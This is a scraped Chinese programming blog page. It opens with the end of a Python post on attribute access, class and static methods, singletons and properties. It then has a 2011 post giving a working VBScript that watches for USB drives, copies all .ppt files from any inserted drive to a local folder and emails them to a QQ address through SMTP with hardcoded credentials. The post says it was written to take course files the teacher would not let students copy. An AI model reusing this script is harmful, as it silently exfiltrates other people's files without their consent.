当我们定义了Foo类f实例变量x,y,z时,我们通过f.x,f.y,f.z访问变量时不通过<strong>getattr</strong>.只有当访问不是正常机制定义的变量时才用<strong>getattr</strong>.这时候<strong>getattr</strong>访问的是<strong>dict</strong>,非正常机制定义的变量在这里.同理<strong>setattr</strong>也是对这里进行操作.<strong>getattribute</strong>是对实例变量进行的访问,当访问的不是实例变量时,会发出异常.还有就是<strong>getattribute</strong>和<strong>getattr</strong>不同时使用.一般<strong>setattr</strong>和<strong>getattribute</strong>配合使用.
<strong>repr</strong>,<strong>str</strong>.
当调用print var时.会调用var的<strong>str</strong>方法,如果没有定义的话,会调用<strong>repr</strong>方法.
<b>类方法</b>
新的对象模型提供了两种类方法:静态方法和类方法.
静态方法可以直接被类或类实例调用.它没有常规方法那样的特殊行为(绑定,非绑定,默认的第一个参数规则等).</p>

<pre lang="python">
class AClass(object):
    @staticmethod
    def astatic():
        print "a static method"
anInstance = AClass()
anInstance.astatic()
AClass.astatic()
</pre>


<p>一个类方法就是你可以通过类或它的实例来,不管你是用类调用这个方法还是用类的实例来调用这个方法.python只会将类对象作为第一个参数传递进去.</p>

<pre lang="python">
class ABase(object):
    @classmethod
    def aclassmet(cls):print cls.__name__
ABase.aclassmet()
</pre>


<p><strong>new</strong>方法实现的单态模式.</p>

<pre lang="python">
class Singleton(object):
    _singletons = {}
    def __new__(cls, *args, **kwds):
        if not cls._singletons.has_key(cls):
            cls._singletons[cls] = object.__new__(cls)
        return cls._singletons[cls]
</pre>


<p><b>properties</b>
property是实例中具有特殊功能的属性,你可以使用property进行引用,绑定和解除绑定.</p>

<pre lang="python">
class Rectangle(object):
    def __init__(self,width,height):
        self.width = width
        self.height = height
    def getArea(self):
        return self.width*self.height
    area = property(getArea, doc='area of the rectangle')
</pre>


<p>以上代码实现了每一个矩形类的实例r均有一个只读属性r.area.
上面讲了<strong>setattr</strong>是往cls.<strong>dict</strong>里添加变量,当我们设置了<strong>slots</strong>的时候,<strong>dict</strong>就不存在了.这会为我们的程序省掉很多内存,而且对访问过滤起到了很大的帮助.
对于new-style class来说,所有属性的引用都是通过<strong>getattribute</strong>来实现的.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/oct/blog/2011/09/03/VBS%E7%9B%91%E8%A7%86%E4%BC%98%E7%9B%98%E6%96%87%E4%BB%B6%E5%B9%B6%E9%82%AE%E7%AE%B1%E5%8F%91%E9%80%81./">VBS监视优盘文件并邮箱发送.</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2011-09-03T05:36:00+08:00" pubdate data-updated="true">Sep 3<span>rd</span>, 2011</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>数据库老师不让拷课件, 有个同学就想写个脚本执行&#8230; 今天帮他调通了这个代码. 用python写应该会更简单些..`</p>

<pre lang="vbscript">
function Send_mail(You_Account,You_Password,Send_Email,Send_Email2,Send_Topic,Send_Body,Send_Attachment, Attach_Count) 
'code by NetPatch 
'VBS发送邮件参数说明 
'You_Account：你的邮件帐号 
'You_Password:你的邮件密码 
'Send_Email: 主要邮件地址 
'Send_Email2: 备用邮件地址 
'Send_Topic: 邮件主题 
'Send_Body: 邮件内容 
'Send_Attachment:邮件附件 

total_attachment_files = Attach_Count
You_ID=Split(You_Account, "@", -1, vbTextCompare) 
'帐号和服务器分离 
MS_Space = "http://schemas.microsoft.com/cdo/configuration/" 
'这个是必须要的，不过可以放心的事，不会通过微软发送邮件 
Set Email = CreateObject("CDO.Message") 
Email.From = You_Account 
'这个一定要和发送邮件的帐号一样 
Email.To = Send_Email '主要邮件地址 

If Send_Email2 <> "" Then 
Email.CC = Send_Email2 '备用邮件地址 
End If 

Email.Subject = Send_Topic '邮件主题 
Email.Textbody = Send_Body '邮件内容 

i=0
do while i<total_attachment_files
MsgBox Send_Attachment(i)
Email.AddAttachment Send_Attachment(i) '邮件附件 
i=i+1
loop

With Email.Configuration.Fields 
.Item(MS_Space&"sendusing") = 2 '发信端口 
.Item(MS_Space&"smtpserver") = "smtp."&You_ID(1) 'SMTP服务器地址 
.Item(MS_Space&"smtpserverport") = 25 'SMTP服务器端口 
.Item(MS_Space&"smtpauthenticate") = 1 'cdobasec 
.Item(MS_Space&"sendusername") = You_ID(0) '你的邮件帐号 
.Item(MS_Space&"sendpassword") = You_Password '你的邮件密码 
.Update 
End With 
Email.Send 
'发送邮件 
Set Email=Nothing 
'关闭组件 

Send_Mail=True 
'如果没有任何错误信息，则表示发送成功,否则发送失败 
If Err Then 
Err.Clear 
Send_Mail=False 
End If 
End Function 





Dim fso
Dim objWMIService
Dim myfolder

strComputer = "." '句点代表本机
set fso = createobject("scripting.filesystemobject") '创建文件系统操作的对象
If not fso.FolderExists("d:\123") Then '判断d盘是否已有123文件夹，如果不存在，则新建
    Set myfolder = fso.CreateFolder("d:\123")
    MsgBox "创建文件夹成功！"
else
'清空文件.
    fso.DeleteFile "d:\123\*", true
End If  
'myfolder.Attributes = 2  '将文件夹属性设为hidden，即隐藏
'MsgBox "隐藏文件夹成功！"
'创建WMI的连接
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" _
    & strComputer & "\root\cimv2")
'对系统盘符变更事件建立通知查询，即有盘符的增加或删除都会被捕获
Set colMonitoredEvents = objWMIService. _
    ExecNotificationQuery( _
        "Select * from Win32_VolumeChangeEvent")
Do '循环，不间断查询 有无盘符变更事件
    Set objLatestEvent = colMonitoredEvents.NextEvent
    path = objLatestEvent.DriveName & "\*.ppt" '得到u盘的名字连带下面所有文件
    fso.CopyFile path, "d:\123\"  '把u盘下的所有文件拷贝到d盘123文件夹下
    MsgBox "拷贝完成"
    Set ff=fso.GetFolder("d:\123\")
    Set fs=ff.Files 
    i=0
    Dim filearray(100)
    For Each f in fs 
       filearray(i) = f
        i=i+1
    Next 
    If Send_Mail("497052184@qq.com","x123","497052184@qq.com","","邮件主题","邮件内容", filearray, i)=True Then
        '
    End if
    exit do
Loop
set fso = Nothing  '收尾处理
set objWMIService = nothing 
</pre>

</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/oct/blog/page/7/">&larr; Older</a>
    
    <a href="/oct/blog/archives">Blog Archives</a>
    
    <a class="next" href="/oct/blog/page/5/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/oct/blog/2012/06/11/emacs_auto-complete_plugins/">emacs_auto-complete_plugins</a>
      </li>
    
      <li class="post">
        <a href="/oct/blog/2012/06/09/LaTex_CJK_%E5%AD%97%E4%BD%93%E9%97%AE%E9%A2%98%5BLinux%5D/">LaTex_CJK_字体问题[Linux]</a>
      </li>
    
      <li class="post">
        <a href="/oct/blog/2012/06/08/nmap_%E4%BD%BF%E7%94%A8./">nmap_使用.</a>
      </li>
    
      <li class="post">
        <a href="/oct/blog/2012/06/07/Arch_PGP_xxx_unknown_%E8%A7%A3%E5%86%B3/">Arch_PGP_xxx_unknown_解决</a>
      </li>
    
      <li class="post">
        <a href="/oct/blog/2012/06/04/Mongo_%E8%81%9A%E5%90%88/">Mongo_聚合</a>
      </li>
    
  </ul>
</section>





<section>
 <h1>Categories</h1>
 <ul id="categories">
 <li class='category'><a href='/oct/blog/categories/android开发/'>Android开发 (16)</a></li>
<li class='category'><a href='/oct/blog/categories/apache/'>Apache (6)</a></li>
<li class='category'><a href='/oct/blog/categories/django/'>Django (3)</a></li>
<li class='category'><a href='/oct/blog/categories/linux/'>Linux (38)</a></li>
<li class='category'><a href='/oct/blog/categories/lisp/'>Lisp (1)</a></li>
<li class='category'><a href='/oct/blog/categories/mapx开发/'>MapX开发 (3)</a></li>
<li class='category'><a href='/oct/blog/categories/mongo/'>Mongo (2)</a></li>
<li class='category'><a href='/oct/blog/categories/moose::manual::attributes/'>Moose::Manual::Attributes (1)</a></li>
<li class='category'><a href='/oct/blog/categories/moose::manual::classes/'>Moose::Manual::Classes (1)</a></li>
<li class='category'><a href='/oct/blog/categories/moose::manual::concepts/'>Moose::Manual::Concepts (1)</a></li>
<li class='category'><a href='/oct/blog/categories/mysql/'>MySQL (3)</a></li>
<li class='category'><a href='/oct/blog/categories/nginx/'>Nginx (2)</a></li>
<li class='category'><a href='/oct/blog/categories/php/'>PHP (30)</a></li>
<li class='category'><a href='/oct/blog/categories/perl/'>Perl (32)</a></li>
<li class='category'><a href='/oct/blog/categories/perldoc/'>PerlDoc (1)</a></li>
<li class='category'><a href='/oct/blog/categories/python/'>Python (42)</a></li>
<li class='category'><a href='/oct/blog/categories/wordpress/'>WordPress (1)</a></li>
<li class='category'><a href='/oct/blog/categories/keepalive/'>keepalive (1)</a></li>
<li class='category'><a href='/oct/blog/categories/linux查看系统状态/'>linux查看系统状态 (1)</a></li>
<li class='category'><a href='/oct/blog/categories/lisp/'>lisp (1)</a></li>
<li class='category'><a href='/oct/blog/categories/make/'>make (1)</a></li>
<li class='category'><a href='/oct/blog/categories/man高亮/'>man高亮 (1)</a></li>
<li class='category'><a href='/oct/blog/categories/moose/'>moose (1)</a></li>
<li class='category'><a href='/oct/blog/categories/pdf/'>pdf (1)</a></li>
<li class='category'><a href='/oct/blog/categories/perlpod/'>perlpod (1)</a></li>
<li class='category'><a href='/oct/blog/categories/pkill/'>pkill (1)</a></li>
<li class='category'><a href='/oct/blog/categories/server/'>server (1)</a></li>
<li class='category'><a href='/oct/blog/categories/skills/'>skills (1)</a></li>
<li class='category'><a href='/oct/blog/categories/sql/'>sql (1)</a></li>
<li class='category'><a href='/oct/blog/categories/ssh/'>ssh (2)</a></li>
<li class='category'><a href='/oct/blog/categories/svn/'>svn (1)</a></li>
<li class='category'><a href='/oct/blog/categories/ubuntu/'>ubuntu (2)</a></li>
<li class='category'><a href='/oct/blog/categories/wp摘要/'>wp摘要 (1)</a></li>
<li class='category'><a href='/oct/blog/categories/wp页面模版/'>wp页面模版 (1)</a></li>
<li class='category'><a href='/oct/blog/categories/乱七八糟/'>乱七八糟 (24)</a></li>
<li class='category'><a href='/oct/blog/categories/前端技术/'>前端技术 (8)</a></li>
<li class='category'><a href='/oct/blog/categories/回归/'>回归 (1)</a></li>
<li class='category'><a href='/oct/blog/categories/设计模式/'>设计模式 (1)</a></li>
<li class='category'><a href='/oct/blog/categories/集体智慧/'>集体智慧 (7)</a></li>

 </ul>
</section>

  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2012 - wangxiaomo -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
